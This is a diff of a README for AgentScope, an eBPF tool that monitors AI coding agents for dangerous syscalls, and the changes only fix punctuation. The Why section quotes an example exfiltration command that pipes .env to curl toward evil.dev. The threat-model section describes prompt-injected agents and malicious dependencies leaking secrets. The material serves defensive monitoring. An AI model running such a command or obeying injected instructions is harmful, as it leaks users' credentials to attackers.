@@ -1,12 +1,12 @@
 # AgentScope
 
-**Kernel-grounded runtime security for AI coding agents.** AgentScope watches what your autonomous agents actually *do* — every exec, file open and outbound connection — using eBPF tracepoints on Linux, evaluates each syscall-level event against a declarative policy, and streams violations to a live dashboard. A deterministic simulated-event source keeps the whole demo working on Windows and macOS too.
+**Kernel-grounded runtime security for AI coding agents.** AgentScope watches what your autonomous agents actually *do*: every exec, file open, and outbound connection. It uses eBPF tracepoints on Linux, evaluates each syscall-level event against a declarative policy, and streams violations to a live dashboard. A deterministic simulated-event source keeps the whole demo working on Windows and macOS too.
 
 [![CI](https://github.com/sambai-dev/agentscope/actions/workflows/ci.yml/badge.svg)](https://github.com/sambai-dev/agentscope/actions/workflows/ci.yml)
 
 ## Why
 
-Autonomous coding agents (Codex, Claude Code, CI workers) run arbitrary installs, arbitrary network calls and arbitrary file reads — with your tokens in the environment. `npm install` executes postinstall scripts from strangers; a prompt injection can turn "fix this bug" into `cat .env | curl -d @- evil.dev`; a compromised tool binary can quietly download payloads. Application-layer logs are whatever the process says they are. Orgs need an **audit trail grounded in the kernel**: out-of-band capture the agent cannot forge, plus enforcement hooks it cannot talk its way out of.
+Autonomous coding agents (Codex, Claude Code, CI workers) run arbitrary installs, arbitrary network calls, and arbitrary file reads while your tokens are in the environment. `npm install` executes postinstall scripts from strangers; a prompt injection can turn "fix this bug" into `cat .env | curl -d @- evil.dev`; a compromised tool binary can quietly download payloads. Application-layer logs are whatever the process says they are. Orgs need an **audit trail grounded in the kernel**: out-of-band capture the agent cannot forge, plus enforcement hooks it cannot talk its way out of.
 
 AgentScope captures:
 
@@ -52,7 +52,7 @@ On non-Linux hosts the collector runs the simulated source instead of loading `b
 3. **Hand-rolled glob matcher.** Secret-path rules need `**`-style matching over ~10 default patterns. Pulling `globset` for that costs compile time and pulls `regex-automata`; our recursive segment matcher is ~60 lines, dependency-free and exhaustively table-tested.
 4. **RingBuf over perf event arrays.** One shared ring preserves global ordering across CPUs, drops samples at the producer (the eBPF program knows), and needs no per-CPU bookkeeping in userspace. Costs a 5.8+ kernel minimum.
 5. **Zero-copy JSON ring records.** Probes reserve a fixed 512-byte RingBuf slot and write escaped JSON directly into it, avoiding a stack copy while keeping the wire format inspectable and backward-compatible with v0.1 probe objects. A malformed or oversized record is discarded rather than emitted as truncated JSON.
-6. **A deterministic simulator as a first-class source.** Kernel collection can't run on Windows/macOS CI. Simulating the exact 24-event attack scenario keeps the pipeline, policies and dashboard exercised on every commit — see `examples/scenario.jsonl`.
+6. **A deterministic simulator as a first-class source.** Kernel collection can't run on Windows/macOS CI. Simulating the exact 24-event attack scenario keeps the pipeline, policies, and dashboard exercised on every commit; see `examples/scenario.jsonl`.
 
 ## Quickstart
 
@@ -111,10 +111,10 @@ exact value, glob, or CIDR in `denied_hosts` and `warn_hosts`.
 
 | Route | Method | Description |
 | --- | --- | --- |
-| `/healthz` | GET | Readiness probe: `200 {"status":"ok"}` while the configured event source (simulated or eBPF collector) is producing, `503 {"status":"degraded"}` otherwise — including a live kernel source that has dropped every record so far |
+| `/healthz` | GET | Readiness probe: `200 {"status":"ok"}` while the configured event source (simulated or eBPF collector) is producing, `503 {"status":"degraded"}` otherwise, including a live kernel source that has dropped every record so far |
 | `/api/metrics` | GET | Prometheus text format (hand-written exposition) |
 | `/v1/events` | POST | Ingest one event or an array of events (reply reports `accepted`/`rejected`; rejections are ingest-backpressure sheds) |
-| `/v1/events?limit&since_seq` | GET | Forward-cursor paging: the oldest `limit` events in ascending seq order, starting strictly after `since_seq` (omit it for the first page — seqs start at 0); feed back the last seen seq until the page comes back empty |
+| `/v1/events?limit&since_seq` | GET | Forward-cursor paging: the oldest `limit` events in ascending seq order, starting strictly after `since_seq` (omit it for the first page; seqs start at 0); feed back the last seen seq until the page comes back empty |
 | `/v1/processes` | GET | Live process forest built from `proc_exec` events |
 | `/v1/violations?limit` | GET | Policy violations, newest last |
 | `/v1/policy` | PUT | Replace the active rule set (audit-logged) |
@@ -142,9 +142,9 @@ Full methodology and history in [docs/BENCHMARKS.md](docs/BENCHMARKS.md).
 
 Personas we defend against:
 
-- **Malicious dependency postinstall script** — `npm exec` spawns install scripts that phone home or read credentials. Detected via `PROC_DENIED` (package managers denied by default), `NET_DENIED`/`NET_WARN` egress rules and `SECRET_ACCESS`.
-- **Prompt-injected agent exfiltrating `.env`** — the agent reads secret paths and ships them to an unknown host. Detected via `SECRET_ACCESS` on the open and `NET_WARN`/`NET_DENIED` on the connect; the timeline correlates both under one tgid.
-- **Compromised tool binary downloading payloads** — a trojanized helper fetches second-stage payloads. Detected via unknown-host egress and `CAP_ESCALATION`.
+- **Malicious dependency postinstall script:** `npm exec` spawns install scripts that phone home or read credentials. Detected via `PROC_DENIED` (package managers denied by default), `NET_DENIED`/`NET_WARN` egress rules, and `SECRET_ACCESS`.
+- **Prompt-injected agent exfiltrating `.env`:** the agent reads secret paths and ships them to an unknown host. Detected via `SECRET_ACCESS` on the open and `NET_WARN`/`NET_DENIED` on the connect; the timeline correlates both under one tgid.
+- **Compromised tool binary downloading payloads:** a trojanized helper fetches second-stage payloads. Detected via unknown-host egress and `CAP_ESCALATION`.
 
 Guarantees: capture is syscall-level ground truth observed by the kernel, so userland evasion like `LD_PRELOAD` shims or log tampering doesn't help an attacker; collection is out-of-band from the monitored workload.
 
@@ -193,4 +193,4 @@ For Fly.io: ship the sim-source image to any region (it needs no privileges); ke
 
 ## License
 
-MIT © 2026 sambai-dev — see [LICENSE](LICENSE).
+MIT © 2026 sambai-dev; see [LICENSE](LICENSE).
